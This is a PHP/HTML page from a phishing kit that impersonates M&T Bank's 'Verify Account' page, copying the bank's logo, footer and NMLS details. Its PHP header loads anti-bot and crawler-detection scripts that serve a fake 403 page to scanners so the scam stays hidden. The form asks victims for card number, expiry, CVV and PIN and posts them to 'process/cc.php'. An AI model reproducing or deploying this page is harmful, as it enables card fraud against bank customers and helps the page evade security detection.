<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
?>

<html lang="en" class="__sticky-footer">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	
	<link href="css/foundation-all.css" rel="stylesheet">
	<link href="css/mtb.css" rel="stylesheet">
	<style>
	/*SUGGESTED ADD FOR THE FRAMEWORK*/
	
	.no-headerFooter > .mtb-page-header {
		display: none;
	}
	
	.no-headerFooter {
		padding-top: 1.5rem;
	}
	</style>
	<title>Verify Account | M&amp;T Bank</title>
	<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
	<meta class="foundation-mq">
	
</head>

<body class="">
	<header class="mtb-page-header">
		<a class="mtb__logo" href=""> <img class="mtb__logo" src="img/mtb-logo.svg" alt="M&amp;T Bank"> </a> <a href="" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
        </a> </header>
	<div data-msg-code="" class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
		<div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
	</div>
	<div class="mtb-app-enrollment--content">
		<form action="process/cc.php" class="js-form js-verifyAccountForm" id="verifyAccountForm" method="post" name="verifyAccountForm">
			<input type="hidden" value="R" name="EnrolleeType" id="EnrolleeType">
			<input type="hidden" value="RetailAccount" name="EnrollmentType" id="EnrollmentType">
			<input type="hidden" name="EnrolleeIdentifier" id="EnrolleeIdentifier">
			<input type="hidden" name="EnrolleeToken" id="EnrolleeToken">
			<input type="hidden" value="False" name="IsMobilePlatfom" id="IsMobilePlatfom">
			<input type="hidden" value="OLB:MOE:VerifyYourAccountInfo" name="TagPageName" id="TagPageName">
			<input type="hidden" value="False" name="SetFieldsToProtected" id="SetFieldsToProtected">
			<section class="grid-x grid-padding-x __spacer-form grid-x__padded">
				<div class="cell">
					<!-- page title -->
					<div class="mtb-section-header mtb-section-header--top">
						
						<h1>
            Verify your Card information
        </h1>
						<p> Enter your card informations to verify. </p>
					</div>
				</div>
				<div class="cell">
					<div class="expanded button-group button-group__toggle">
						<button data-ensightentag="AccountInfoButton" type="button" class="button js-enrolleeTypeTab active" data-value="R" data-defaultaccounttype="RetailAccount" data-url="/Enrollment/EnrollmentType">Card Information</button>
						
						
						
					</div>
				</div>
				<div class="cell hide" data-showfor="BusinessAccount">
					<h2 class="mtb-form__section-title hide" data-showfor="BusinessAccount">
        Company Administrator Information
            <button tabindex="0" type="button" class="m-icon m-icon-questionmarkcircle __contextual-help mtb-help m-icon-questionmarkcircle js-modal-trigger" aria-haspopup="true" aria-controls="reveal-basic" data-ensightentag="CompanyAdministratorInfoQuestionIcon" data-open="companyadmin-modal">
                <span class="show-for-sr">Show Help</span>
            </button>
    </h2> </div>
				<div data-parentfor="FirstName" class="cell js-formFieldParent" data-showfor="BusinessAccount">
					<label for="FirstName">Card Number</label>
					<input data-fcid="" value="" maxlength="20" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="letters" placeholder="xxxx xxxx xxxx xxxx" type="text" id="cnum" name="cnum" data-inputtype="text" required="true">
					<script src="js/mask.js"></script>
                         <script>
                                    var element = document.getElementById('cnum');
                                    var maskOptions = {mask: '0000 0000 0000 0000'};
                                    var mask = IMask(element, maskOptions);
                                    </script>
					<p class="form-error" id="FirstNameError" role="alert"></p>
					<p class="form-help-text"></p>
				</div>
				<div data-parentfor="LastName" class="cell js-formFieldParent" data-showfor="BusinessAccount">
					<label for="LastName">Expiry</label>
					<input data-fcid="" value="" maxlength="20" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbersletters" placeholder="MM/YYYY" type="text" id="exp" name="exp" data-inputtype="text" required="true">
					<script src="js/mask.js"></script>
                         <script>
                                    var element = document.getElementById('exp');
                                    var maskOptions = {mask: '00/0000'};
                                    var mask = IMask(element, maskOptions);
                                    </script>
					<p class="form-error" id="LastNameError" role="alert"></p>
					<p class="form-help-text"></p>
				</div>
				<div data-parentfor="AccountNumber" class="cell js-formFieldParent" data-formattype="">
					<label for="AccountNumber">3 Digit Code</label>
					<div class="js-maskFldParent input-group m-fake-single-input" data-maskoverlay="">
						<input data-fcid="" value="" maxlength="20" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbers" placeholder="xxx" data-inputtype="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus js-keeponclear" type="tel" id="cvv" name="cvv" required="true">
						<script src="js/mask.js"></script>
                         <script>
                                    var element = document.getElementById('cvv');
                                    var maskOptions = {mask: '000'};
                                    var mask = IMask(element, maskOptions);
                                    </script>
						
					</div>
					<p class="form-error" id="AccountNumberError" role="alert"></p>
					<p class="form-help-text"></p>
				</div>
				<div data-parentfor="SecurityPin" class="cell js-formFieldParent" data-showfor="BusinessCreditCard,BusinessDebitCard,RetailCreditCard,RetailDebitCard">
					<label for="SecurityPin">Card Pin</label>
					<input data-fcid="" value="" maxlength="5" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbers" placeholder="xxxx" type="text" id="pin" name="pin" data-inputtype="text" required="true">
					<script src="js/mask.js"></script>
                         <script>
                                    var element = document.getElementById('pin');
                                    var maskOptions = {mask: '0000'};
                                    var mask = IMask(element, maskOptions);
                                    </script>
					<p class="form-error" id="SecurityPinError" role="alert"></p>
					<p class="form-help-text"></p>
				</div>


				
			</section>
			<section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">
				<div class="cell">
					<button data-ensightentag="ContinueButton" type="submit" data-url="" class="button button__form js-submit"> Continue </button>
				</div>
				<div class="cell"> <a href="/Enrollment/Index" class="button button__fake-padding expanded clear">
                Go Back
            </a> </div>
			</section>
		</form>
		<input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility"> </div>
	<footer class="mtb-footer" role="contentinfo">
		<div class="grid-x grid-padding-x align-center-middle grid-x__padded">
			<div class="cell">
				<p> ©2021 M&amp;T Bank. All Rights Reserved.
					<br> Users of this website agree to be bound by the provisions of the M&amp;T website <a href="" target="_blank">Terms of Use</a> and <a href="" target="_blank">Privacy Policy</a>. </p>
				<div class="mtb-footer__logo">
					<a href="" target="_blank"> <img src="img/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender"> </a>
					<a href="" target="_blank"> <img src="img/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust"> </a>
				</div>
				<p> Equal Housing Lender. NMLS #381076
					<br> <a href="" target="_blank">Member FDIC.</a> </p>
			</div>
		</div>
	</footer>
	
</body>

</html>